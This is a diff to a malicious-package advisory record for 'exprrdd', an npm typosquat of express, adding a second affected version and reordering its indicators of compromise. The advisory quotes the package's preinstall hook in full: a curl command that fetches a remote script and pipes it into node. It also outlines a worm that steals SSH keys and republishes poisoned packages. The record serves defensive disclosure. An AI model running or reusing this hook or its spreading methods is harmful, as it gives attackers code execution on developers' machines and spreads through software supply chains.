@@ -2,7 +2,7 @@
   "schema_version": "1.7.4",
   "id": "MAL-2026-17244",
   "published": "2026-09-29T07:12:49Z",
-  "modified": "2026-10-01T08:00:00Z",
+  "modified": "2026-10-04T23:18:29.199611014Z",
   "summary": "Malicious code in exprrdd (npm)",
   "details": "The package exprrdd impersonates the legitimate 'express' package (it republishes express's package metadata and code) and adds a malicious preinstall hook that runs automatically on npm install, before any dependency is installed: `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`. The hook downloads a remote JavaScript second stage from a Wayback Machine mirror of a Codeberg repository (hellscripter/install-scripts) and pipes it directly into node, giving the attacker arbitrary code execution on the installing machine. Version 5.2.1 was published on 2026-09-29. It is one of nine packages published within about 33 minutes by the npm account 'dirtyblanket' (maintainer email s7dwzxru4z@ooynib.com), all carrying the identical preinstall hook: xeprews, express-javascript, express-nodejs, react-nodejs, exprdd, exprrdd, exptrdd, exptred, exptredd.\n\nOn Linux, node.js pipes linux.sh from the same Codeberg repository into bash. linux.sh (SHA-256 65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577) is a worm. It installs a Go binary, systemd-fontd, as a systemd service named \"Font Rendering Service\" that proxies through Tor. SafeDep has not yet analyzed that binary. The script collects SSH private keys and known_hosts files, then connects to the known hosts over SSH and runs linux.sh on them. With the same keys, it pushes a linux.sh loader into the .install file of Arch User Repository (AUR) packages that the key owner maintains. For each package.json on disk, it adds the same preinstall script, runs npm version patch, and runs npm publish with each .npmrc it finds.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (bc1c956097cd13e80298a796a5026ebd91ece7c2ad53d226d3729f0b0b0ee9f3)\nPackage 'exprrdd' copies express's metadata (name-lookalike, description, author, contributors, repository, keywords, dependencies) as cover for a preinstall dropper. package.json line 98 declares a preinstall script that runs `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js` and pipes the response directly into `node`, executing attacker-controlled JavaScript on the installer's machine at `npm install` time. The fetched script is unpinned and mutable (a raw branch URL fronted by a web.archive.org rewrite), so whoever controls the codeberg.org/hellscripter repository gains arbitrary code execution on every host that installs this package. The typosquat name maximizes accidental installs by developers mistyping 'express'.\n",
   "affected": [
@@ -12,10 +12,16 @@
         "ecosystem": "npm"
       },
       "versions": [
-        "5.2.1"
+        "5.2.1",
+        "5.2.2"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -55,45 +61,49 @@
     {
       "type": "REPORT",
       "url": "https://safedep.io/dirtyblanket-express-impersonation-npm/"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/exprrdd/v/5.2.2"
     }
   ],
   "database_specific": {
     "iocs": {
+      "files": [
+        {
+          "note": "preinstall script pipes the web.archive.org copy of node.js into node.",
+          "paths": [
+            "package.json"
+          ],
+          "source": "PACKAGE_ARCHIVE"
+        },
+        {
+          "digests": {
+            "sha256": "65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577"
+          },
+          "note": "Stage two Bash worm, piped from curl into bash.",
+          "paths": [
+            "linux.sh"
+          ],
+          "source": "IN_MEMORY"
+        },
+        {
+          "digests": {
+            "sha256": "2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2"
+          },
+          "note": "systemd-fontd, a stripped Go ELF x86-64 binary run as the \"Font Rendering Service\" systemd service. First path as root, second path without root.",
+          "paths": [
+            "/usr/lib/systemd/systemd-fontrenderd",
+            "~/.config/systemd/systemd-fontcached"
+          ],
+          "source": "DROPPED"
+        }
+      ],
       "urls": [
         "https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js",
         "https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js",
         "https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh",
         "https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/systemd-fontd"
-      ],
-      "files": [
-        {
-          "source": "PACKAGE_ARCHIVE",
-          "paths": [
-            "package.json"
-          ],
-          "note": "preinstall script pipes the web.archive.org copy of node.js into node."
-        },
-        {
-          "source": "IN_MEMORY",
-          "paths": [
-            "linux.sh"
-          ],
-          "digests": {
-            "sha256": "65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577"
-          },
-          "note": "Stage two Bash worm, piped from curl into bash."
-        },
-        {
-          "source": "DROPPED",
-          "paths": [
-            "/usr/lib/systemd/systemd-fontrenderd",
-            "~/.config/systemd/systemd-fontcached"
-          ],
-          "digests": {
-            "sha256": "2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2"
-          },
-          "note": "systemd-fontd, a stripped Go ELF x86-64 binary run as the \"Font Rendering Service\" systemd service. First path as root, second path without root."
-        }
       ]
     },
     "malicious-packages-origins": [
@@ -105,6 +115,16 @@
         "source": "amazon-inspector",
         "versions": [
           "5.2.1"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-020880",
+        "import_time": "2026-10-04T23:16:30.092692876Z",
+        "modified_time": "2026-10-04T23:13:21Z",
+        "sha256": "ab1339e1e92019ee26bd6d9ddf7ad6536dea8226df3a6412fe2dcdcf37872872",
+        "source": "amazon-inspector",
+        "versions": [
+          "5.2.2"
         ]
       }
     ]
@@ -123,10 +143,10 @@
     },
     {
       "name": "SafeDep",
-      "type": "FINDER",
       "contact": [
         "https://safedep.io"
-      ]
+      ],
+      "type": "FINDER"
     }
   ]
 }
